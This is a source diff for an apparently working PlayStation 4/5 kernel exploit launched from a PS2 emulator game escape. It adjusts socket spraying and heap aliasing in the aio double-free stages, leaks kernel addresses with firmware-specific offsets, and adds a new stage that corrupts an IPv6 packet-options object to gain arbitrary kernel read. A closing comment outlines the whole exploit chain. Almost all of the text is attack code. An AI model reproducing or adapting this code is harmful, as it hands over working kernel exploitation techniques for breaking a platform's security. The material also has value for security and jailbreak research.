@@ -78,7 +78,8 @@ int32_t cpu_affinity_priority()
         return err;
 }
 
-#define NUM_SDS 100
+// Max number of sockets is 127
+#define NUM_SDS 120
 #define NUM_WORKERS 2
 #define NUM_GROOM_IDS 0x200
 // Max number of req allocations per submission in one 0x80 malloc slab (3)
@@ -241,6 +242,9 @@ int32_t make_aliased_rthdrs()
             sds[i] = -1;
             sds[rthdr.ip6r_reserved] = -1;
             free_rthdrs(sds, NUM_SDS);
+            // Recreate the missing sockets
+            sds[i] = create_ipv6udp();
+            sds[rthdr.ip6r_reserved] = create_ipv6udp();
             return 0;
         }
     }
@@ -387,9 +391,7 @@ int32_t race_one(
     // Get TCP info
     uint8_t info_buf[SIZE_TCP_INFO] = {0};
     socklen_t info_size = SIZE_TCP_INFO;
-    err = PS::getsockopt(
-        sd_conn, IPPROTO_TCP, TCP_INFO, info_buf, &info_size
-    );
+    err = PS::getsockopt(sd_conn, IPPROTO_TCP, TCP_INFO, info_buf, &info_size);
 
     if (err || info_size != SIZE_TCP_INFO) {
         printf_debug("Failed to get TCP info! SIZE_TCP_INFO %d info_size %d\n",
@@ -681,8 +683,8 @@ int32_t leak_kernel_addrs()
     //     } waiters;
 
     // evf.cv.cv_description = "evf cv"
-    // string is located at the kernel's mapped ELF file
-    // 0x007b5133 "evf cv" for FW 10.01.
+    // The string is located at the kernel's mapped ELF file
+    // "evf cv" offset is 0x007b5133 for FW 10.01.
     stage2_data.evf_cv_str_p = *(uint64_t*)(&stage2_data.buf[0x28]);
 
     printf_debug("\"evf cv\" string address found! %p\n",
@@ -693,7 +695,6 @@ int32_t leak_kernel_addrs()
     // Because of TAILQ_INIT() (a linked list macro), we have:
     // evf.waiters.tqh_last == &evf.waiters.tqh_first (closed loop)
     // It's the real address of the leaked `evf` object in the kernel heap
-    // For what are we going to use this??
     stage2_data.evf_p = *(uint64_t*)(&stage2_data.buf[0x40]) - (uint64_t)0x38;
     
     // %p only works for 64-bit addresses when prefixed with 0xffffffff
@@ -706,9 +707,8 @@ int32_t leak_kernel_addrs()
     set_evf_flags(stage2_data.evf, 0xff00);
     stage2_data.len *= NUM_LEAKED_BLOCKS;
 
-    // Use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
-    // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
-    // field ???
+    // Use reqs1 to fake a aio_info. Set .ai_cred (offset 0x10) to offset 4 of
+    // the reqs2 so crfree(ai_cred) will harmlessly decrement .ar2_ticket ???
     ptr64_t ucred = stage2_data.evf_p + 4;
 
     SceKernelAioRWRequest leak_reqs[NUM_ELEMS] = {0};
@@ -749,6 +749,7 @@ int32_t leak_kernel_addrs()
     printf_debug("reqs2 offset: %p\n", reqs2_off);
     stage2_data.req2 = (aio_entry *)&stage2_data.buf[reqs2_off];
 
+    // reqs1 lives in the 0x100 zone
     stage2_data.reqs1 = stage2_data.req2->ar2_reqs1;
     printf_debug("reqs1: 0x%08x%08x\n", 
         (uint32_t)(stage2_data.reqs1 >> 32), (uint32_t)stage2_data.reqs1);
@@ -770,7 +771,7 @@ int32_t leak_kernel_addrs()
         printf_debug("Found target_id at batch: %d\n", i / NUM_ELEMS);
         hexdump((uint8_t *)stage2_data.req2, 0x80);
         // Why do we assume that target_id is the first one in the batch?
-        // It could be any of the `NUM_ELEMS`, right?
+        // It could be any of the `NUM_ELEMS`, right ???
         stage2_data.target_id = leak_ids[i];
         leak_ids[i] = 0; // target_id won't be freed by free_aios2
         printf_debug("target_id: %p\n", stage2_data.target_id);
@@ -797,21 +798,19 @@ int32_t pktopts_sds[2] = {-1, -1};
 int32_t make_aliased_pktopts()
 {
     int32_t *sds = setup_data.sds;
-    uint32_t tclass = 0;
 
-    for (uint32_t loop = 0; loop < NUM_ALIAS; loop++)
+    for (uint32_t loop = 0; loop < NUM_ALIAS * 10; loop++)
     {
         for (uint32_t i = 0; i < NUM_SDS; i++)
         {
             if (sds[i] < 0) continue; // Skip invalid sockets
-            tclass = i;
-            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
-            // Clean-up needed !!!
+            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &i, sizeof(i));
         }
 
         for (uint32_t i = 0; i < NUM_SDS; i++)
         {
             if (sds[i] < 0) continue; // Skip invalid sockets
+            uint32_t tclass = 0;
             socklen_t len = sizeof(tclass);
             err = PS::getsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, &len);
             if (err) continue;
@@ -821,17 +820,18 @@ int32_t make_aliased_pktopts()
             pktopts_sds[0] = sds[i];
             pktopts_sds[1] = sds[tclass];
             printf_debug("pktopts_sds: %d %d\n", pktopts_sds[0], pktopts_sds[1]);
-
-            // Add pktopts to the new sockets now while new allocs can't
-            // use the double freed memory
+            // Recreate the missing sockets
             sds[tclass] = create_ipv6udp();
             sds[i] = create_ipv6udp();
-            len = sizeof(tclass);
+            // We need to give pktopts to the new sockets now to prevent unnecessary
+            // allocations that might interfere with our attempt to alias rthdrs later,
+            // since calling set_rthdr() will make a pktopts if a socket doesn't have it
             PS::setsockopt(sds[tclass], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
             PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
             return 0;
         }
 
+        // Free pktopts objects
         for (uint32_t i = 0; i < NUM_SDS; i++)
         {
             if (sds[i] < 0) continue; // Skip invalid sockets
@@ -951,7 +951,7 @@ int32_t double_free_reqs1()
             printf_debug("req_idx: %d\n", req_idx);
             printf_debug("found req_id at batch: %d\n", j / MAX_REQS);
             printf_debug("states: ");
-            for (uint32_t k = 0; k < MAX_REQS; k++)
+            for (uint32_t k = 0; k < 7; k++)
                 printf_debug("%08x ", states[k]);
             printf_debug("\n");
             printf_debug("states[%d]: %08x\n", req_idx, states[req_idx]);
@@ -1016,7 +1016,6 @@ int32_t double_free_reqs1()
     // RESTORE: double freed memory has been reclaimed with harmless data
     // PANIC: 0x100 malloc zone pointers aliased
     err = make_aliased_pktopts();
-    if (err) return err;
 
     printf_debug("Delete errors: %08x, %08x\n", errs[0], errs[1]);
 
@@ -1040,6 +1039,129 @@ int32_t double_free_reqs1()
         printf_debug("ERROR: double free on a 0x100 malloc zone failed\n");
         return -1;
     }
+
+    if (err) return err;
+    return 0;
+}
+
+#if defined(PS4)
+#define TCLASS_OFFSET 0xb0
+#elif defined(PS5)
+#define TCLASS_OFFSET 0xc0
+#endif
+
+uint64_t kread64(ptr64_t addr)
+{
+    ptr64_t pktinfo_p = stage2_data.reqs1 + 0x10;
+    uint8_t pktinfo[0x14] = {0};
+    // pktinfo.ip6po_pktinfo = &pktinfo.ip6po_pktinfo
+    // This needed again to prevent `setsockopt` from overwriting
+    // the `pktinfo_p` pointer we set earlier.
+    *(uint64_t*)pktinfo = pktinfo_p;
+
+    uint32_t nhop = 0;
+    uint8_t read_buf[8] = {0};
+    uint32_t len = sizeof(read_buf), offset = 0;
+
+    // While this seems dumb at first, getsockopt/IPV6_NEXTHOP
+    // doesn't always respect the length we provide. This loop
+    // guarentees that we read the full 8 bytes no matter what.
+    while (offset < len)
+    {
+        // pktopts.ip6po_nhinfo = addr + offset
+        *(uint64_t*)&pktinfo[0x8] = addr + offset;
+        nhop = len - offset;
+
+        err = PS::setsockopt(
+            pktopts_sds[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
+        );
+
+        PS::getsockopt(
+            pktopts_sds[0], IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + offset, &nhop
+        );
+
+        printf_debug("offset: %d nhop: %d read_buf: %02x %02x %02x %02x %02x %02x %02x %02x\n",
+            nhop, offset,
+            read_buf[0], read_buf[1],
+            read_buf[2], read_buf[3],
+            read_buf[4], read_buf[5],
+            read_buf[6], read_buf[7]
+        );
+
+        if (nhop == 0) read_buf[offset++] = 0; // Fallbacks to 0
+        else offset += nhop;
+    }
+
+    return *(uint64_t*)read_buf;
+}
+
+int32_t make_kernel_arw()
+{
+    printf_debug("STAGE 4: Get arbitrary kernel read/write\n");
+
+    ip6_rthdr<0x100> rthdr = {0};
+    uint8_t *pktopts = (uint8_t*)&rthdr;
+
+    ptr64_t pktinfo_p = stage2_data.reqs1 + 0x10;
+
+    printf_debug("pktinfo_p: 0x%08x%08x\n", 
+        (uint32_t)(pktinfo_p >> 32), (uint32_t)pktinfo_p);
+
+    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+    // We do this to trick setsockopt/getsockopt into reading/writing
+    // to the pktopts object itself instead of an external pktinfo
+    *(uint64_t*)(&pktopts[0x10]) = pktinfo_p;
+
+    printf_debug("* Overwrite main pktopts\n");
+    int32_t reclaim_sd = -1;
+    PS::close(pktopts_sds[1]);
+    pktopts_sds[1] = -1;
+
+    uint32_t tclass = 0;
+
+    for (uint32_t i = 0; i < NUM_ALIAS; i++)
+    {
+        for (uint32_t j = 0; j < NUM_SDS; j++)
+        {
+            if (setup_data.sds[j] < 0) continue; // Skip invalid sockets
+            *(uint32_t*)&pktopts[TCLASS_OFFSET] = 0x4141 | i << 16;
+            set_rthdr(setup_data.sds[j], &rthdr, rthdr.used_size);
+        }
+
+        socklen_t len = sizeof(tclass);
+        PS::getsockopt(
+            pktopts_sds[0], IPPROTO_IPV6, IPV6_TCLASS, &tclass, &len
+        );
+
+        if ((tclass & 0xffff) == 0x4141)
+        {
+            printf_debug("tclass: %08x\n", tclass);
+            reclaim_sd = setup_data.sds[tclass >> 16];
+            setup_data.sds[tclass >> 16] = -1;
+            printf_debug("Found reclaim_sd %d at attempt: %d\n",
+                reclaim_sd, i);
+            break;
+        }
+    }
+
+    if (reclaim_sd < 0) {
+        printf_debug("Failed to overwrite main pktopts\n");
+        return -1;
+    }
+
+    // Test read
+    uint64_t value = kread64(stage2_data.evf_cv_str_p);
+    uint8_t *str = (uint8_t*)&value;
+
+    printf_debug("Test read `evf_cv_str_p`: %c%c%c%c%c%c%c%c",
+        str[0], str[1], str[2], str[3], str[4], str[5], str[6], str[7]);
+    printf_debug("\n");
+
+    value = kread64(pktinfo_p);
+
+    printf_debug("Test read `pktinfo_p`: 0x%08x%08x\n",
+        (uint32_t)(value >> 32), (uint32_t)value);
+
     return 0;
 }
 
@@ -1074,13 +1196,23 @@ void cleanup()
     if (rthdr_sds[0] > 0) PS::close(rthdr_sds[0]);
 }
 
+// overview:
+// * double free a aio_entry (resides at a 0x80 malloc zone)
+// * type confuse a evf and a ip6_rthdr
+// * use evf/rthdr to read out the contents of the 0x80 malloc zone
+// * leak a address in the 0x100 malloc zone
+// * write the leaked address to a aio_entry
+// * double free the leaked address
+// * corrupt a ip6_pktopts for restricted r/w
+// * corrupt a pipe for arbitrary r/w
+
 void main()
 {
     // PS2 Breakout
     PS::Breakout::init();
 
     // Attempt to connect to debug server
-    PS::Debug.connect(IP(192, 168, 1, 37), 9023);
+    PS::Debug.connect(IP(192, 168, 1, 38), 9023);
 
     // HELLO EVERYNYAN!
     Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
@@ -1100,6 +1232,9 @@ void main()
 
     // STAGE 3: Double free SceKernelAioRWRequest
     if (double_free_reqs1() != 0) goto end;
+
+    // STAGE 4: Get arbitrary kernel read/write
+    if (make_kernel_arw() != 0) goto end;
 
     end:
         cleanup();
